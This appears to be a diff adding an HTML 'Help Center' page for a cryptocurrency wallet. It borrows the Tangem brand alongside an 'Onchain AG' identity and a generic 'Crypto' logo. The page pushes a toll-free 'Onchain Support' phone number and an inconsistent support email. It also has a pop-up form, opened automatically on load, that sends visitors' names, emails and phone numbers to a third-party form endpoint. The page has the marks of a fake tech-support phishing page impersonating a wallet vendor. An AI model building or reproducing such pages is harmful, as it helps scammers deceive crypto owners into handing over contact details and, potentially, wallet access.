@@ -1,0 +1,217 @@
+<html lang="en">
+
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <title>Help Center</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />
+  <style>
+    body {
+      font-family: "Inter", sans-serif;
+    }
+  </style>
+</head>
+
+<body class="bg-gradient-to-br from-[#0B0F2E] via-[#10163F] to-[#1B245C] text-white min-h-screen">
+  <!-- Header -->
+  <header class="flex items-center justify-between px-4 sm:px-6 py-3 sm:py-4 max-w-7xl mx-auto border-b border-white/10">
+    <div class="flex items-center space-x-2">
+      <img alt="Crypto logo" class="w-6 h-6 sm:w-7 sm:h-7"
+        src="https://storage.googleapis.com/a1aa/image/024b10f4-7f72-4c7f-f439-2945ac3316a7.jpg" />
+      <span class="font-bold text-base sm:text-lg md:text-xl lg:text-2xl">Crypto</span>
+    </div>
+    <div class="flex items-center space-x-3 sm:space-x-4">
+      <button onclick="callNow()"
+        class="bg-[#3B7FFF] text-white text-xs sm:text-sm md:text-base font-semibold px-3 sm:px-4 py-1.5 sm:py-2 rounded-lg hover:bg-[#2a5edb] transition shadow-md">
+        Call Now
+      </button>
+      <button aria-label="Open menu" class="text-white text-lg sm:text-xl lg:hidden" type="button">
+        <i class="fas fa-bars"></i>
+      </button>
+    </div>
+  </header>
+
+  <!-- Hero Section -->
+  <main class="max-w-5xl mx-auto px-4 sm:px-6 py-10 sm:py-16">
+    <div class="flex justify-center mb-8 sm:mb-10">
+      <div
+        class="bg-white/5 backdrop-blur-lg border border-white/10 rounded-2xl shadow-xl p-6 sm:p-8 text-center max-w-5xl w-full">
+
+        <p class="text-xs sm:text-sm text-gray-400 mb-2 sm:mb-3">We're here to help</p>
+
+        <h1 class="text-white font-extrabold text-2xl sm:text-4xl md:text-5xl lg:text-6xl leading-tight mb-4 sm:mb-6">
+          Help Center
+        </h1>
+
+        <p class="text-gray-300 text-sm sm:text-base mb-4 sm:mb-6">For Technical Support:</p>
+
+        <!-- Call Button -->
+        <a onclick="callNow()"
+          class="inline-block cursor-pointer bg-gradient-to-r from-[#3B7FFF] to-[#2a5edb] text-white font-bold text-base sm:text-lg md:text-xl px-4 sm:px-6 md:px-8 py-2.5 sm:py-3 md:py-4 rounded-full shadow-lg transition transform hover:scale-105">
+          📞 +1-888-319-4703
+        </a>
+
+        <!-- Onchain Support Mention -->
+        <p class="text-gray-300 text-xs sm:text-sm md:text-base mt-4 sm:mt-6">Need help? Our <span
+            class="text-[#3B7FFF] font-semibold">Onchain
+            Support</span> team is available 24/7.</p>
+
+        <!-- Open Query Form Button -->
+        <div class="mt-6 sm:mt-8">
+          <button onclick="openModal()"
+            class="bg-[#3B7FFF] text-white font-semibold text-xs sm:text-sm md:text-base px-4 sm:px-6 py-2 sm:py-3 rounded-lg shadow-md hover:bg-[#2a5edb] transition">
+            Have a Query?
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Quick Links -->
+    <section class="space-y-4 sm:space-y-6 mb-12 sm:mb-16 max-w-5xl mx-auto text-center">
+      <div class="bg-white/5 p-5 sm:p-6 md:p-8 rounded-xl shadow-lg hover:shadow-2xl transition">
+        <p class="font-semibold text-base sm:text-lg md:text-xl mb-2 sm:mb-3">Get started</p>
+        <p class="text-gray-300 text-xs sm:text-sm md:text-base mb-3 sm:mb-4">
+          Easy set up Tangem and start using it.
+        </p>
+        <a class="text-[#3B7FFF] text-xs sm:text-sm font-medium hover:underline" href="#">
+          Start now &gt;
+        </a>
+      </div>
+
+      <div class="bg-white/5 p-5 sm:p-6 md:p-8 rounded-xl shadow-lg hover:shadow-2xl transition">
+        <p class="font-semibold text-base sm:text-lg md:text-xl mb-2 sm:mb-3">Tangem Guide</p>
+        <p class="text-gray-300 text-xs sm:text-sm md:text-base mb-3 sm:mb-4">
+          All about Tangem products and their main features.
+        </p>
+        <a class="text-[#3B7FFF] text-xs sm:text-sm font-medium hover:underline" href="#">
+          Check Guide &gt;
+        </a>
+      </div>
+
+      <div class="bg-white/5 p-5 sm:p-6 md:p-8 rounded-xl shadow-lg hover:shadow-2xl transition">
+        <p class="font-semibold text-base sm:text-lg md:text-xl mb-2 sm:mb-3">Tangem AMAs</p>
+        <p class="text-gray-300 text-xs sm:text-sm md:text-base mb-3 sm:mb-4">
+          Learn more about Tangem from our expert speakers.
+        </p>
+        <a class="text-[#3B7FFF] text-xs sm:text-sm font-medium hover:underline" href="#">
+          Watch now &gt;
+        </a>
+      </div>
+
+      <!-- New Onchain Support Card -->
+      <div class="bg-white/5 p-5 sm:p-6 md:p-8 rounded-xl shadow-lg hover:shadow-2xl transition">
+        <p class="font-semibold text-base sm:text-lg md:text-xl mb-2 sm:mb-3">Onchain Support</p>
+        <p class="text-gray-300 text-xs sm:text-sm md:text-base mb-3 sm:mb-4">
+          Direct assistance from our Onchain experts whenever you need it.
+        </p>
+        <a class="text-[#3B7FFF] text-xs sm:text-sm font-medium hover:underline"
+          href="mailto:support@onchainCrypto.com">
+          Contact Support &gt;
+        </a>
+      </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="mt-12 sm:mt-20 text-center max-w-xs sm:max-w-sm mx-auto">
+      <div class="flex items-center justify-center space-x-2 mb-2 sm:mb-3">
+        <img alt="Crypto logo" class="w-5 h-5 sm:w-6 sm:h-6"
+          src="https://storage.googleapis.com/a1aa/image/024b10f4-7f72-4c7f-f439-2945ac3316a7.jpg" />
+        <p class="font-semibold text-xs sm:text-sm">Crypto</p>
+      </div>
+      <p class="text-gray-400 text-xs sm:text-sm mb-2">
+        Global Headquarters, Onchain AG <br />
+        Baarerstrasse 10, 6300 Zug, Switzerland
+      </p>
+
+      <!-- Onchain Support Mention -->
+      <p class="text-gray-300 text-xs sm:text-sm mb-1">For assistance, reach out to <span
+          class="text-[#3B7FFF] font-semibold">Onchain Support</span></p>
+
+      <a class="text-[#3B7FFF] text-xs sm:text-sm underline mt-1 inline-block">
+        support@onchainCrypto.com
+      </a>
+    </footer>
+  </main>
+
+  <!-- Modal -->
+  <div id="queryModal"
+    class="fixed inset-0 bg-black/70 hidden items-center justify-center p-3 sm:p-4 z-50 transition duration-300">
+    <div
+      class="bg-gradient-to-br from-[#0B0F2E] to-[#1B245C] rounded-2xl shadow-xl w-full max-w-md sm:max-w-lg p-5 sm:p-6 md:p-8 relative">
+      <!-- Close Button -->
+      <button onclick="closeModal()" class="absolute top-3 sm:top-4 right-3 sm:right-4 text-white text-lg sm:text-xl hover:text-gray-300">
+        <i class="fas fa-times"></i>
+      </button>
+
+
+            <h2 class="text-xl sm:text-2xl md:text-3xl font-bold mb-3 sm:mb-4 text-center">Crypto Support</h2>
+      <p class="text-gray-300 text-xs sm:text-sm md:text-base text-center mb-4 sm:mb-6">Crypto Wallet Support Get Help and Support Immediately</p>
+
+      <!-- Form -->
+      <form action="https://formspree.io/f/mzzaayyk" method="POST" class="space-y-3 sm:space-y-4">
+        <div>
+          <label class="block text-xs sm:text-sm font-medium text-gray-300 mb-1">Full Name</label>
+          <input type="text" name="name" placeholder="Enter your name" required
+            class="w-full px-3 py-2 sm:px-4 sm:py-3 rounded-lg bg-white/10 border border-white/20 text-white text-xs sm:text-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-[#3B7FFF]" />
+        </div>
+
+        <div>
+          <label class="block text-xs sm:text-sm font-medium text-gray-300 mb-1">Email Address</label>
+          <input type="email" name="email" placeholder="Enter your email" required
+            class="w-full px-3 py-2 sm:px-4 sm:py-3 rounded-lg bg-white/10 border border-white/20 text-white text-xs sm:text-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-[#3B7FFF]" />
+        </div>
+
+        <div>
+          <label class="block text-xs sm:text-sm font-medium text-gray-300 mb-1">Phone Number</label>
+          <input type="tel" name="phone" placeholder="+1-888-319-4703"
+            class="w-full px-3 py-2 sm:px-4 sm:py-3 rounded-lg bg-white/10 border border-white/20 text-white text-xs sm:text-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-[#3B7FFF]" />
+        </div>
+
+        <div>
+          <label class="block text-xs sm:text-sm font-medium text-gray-300 mb-1">Your Message</label>
+          <textarea name="message" rows="3" placeholder="Write your query here..."
+            class="w-full px-3 py-2 sm:px-4 sm:py-3 rounded-lg bg-white/10 border border-white/20 text-white text-xs sm:text-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-[#3B7FFF]"></textarea>
+        </div>
+
+        <div class="text-center">
+          <button type="submit"
+            class="w-full bg-gradient-to-r from-[#3B7FFF] to-[#2a5edb] text-white font-bold text-sm sm:text-base px-4 sm:px-6 py-2.5 sm:py-3 rounded-lg shadow-lg hover:scale-105 transition">
+            Send Query
+          </button>
+        </div>
+      </form>
+
+      <p class="text-gray-300 text-xs sm:text-sm md:text-base text-center mt-4 sm:mt-6">
+        Or reach us directly at: <span class="text-[#3B7FFF] font-semibold">📞 +1-888-319-4703</span>
+      </p>
+    </div>
+  </div>
+
+</body>
+
+<script>
+  function callNow() {
+    window.location.href = 'tel:+1-888-319-4703';
+  }
+
+  function openModal() {
+    document.getElementById('queryModal').classList.remove('hidden');
+    document.getElementById('queryModal').classList.add('flex');
+  }
+
+  function closeModal() {
+    document.getElementById('queryModal').classList.remove('flex');
+    document.getElementById('queryModal').classList.add('hidden');
+  }
+
+  // Auto open modal after 2 seconds
+  window.addEventListener("load", function () {
+    setTimeout(() => {
+      openModal();
+    }, 2000);
+  });
+</script>
+
+</html>
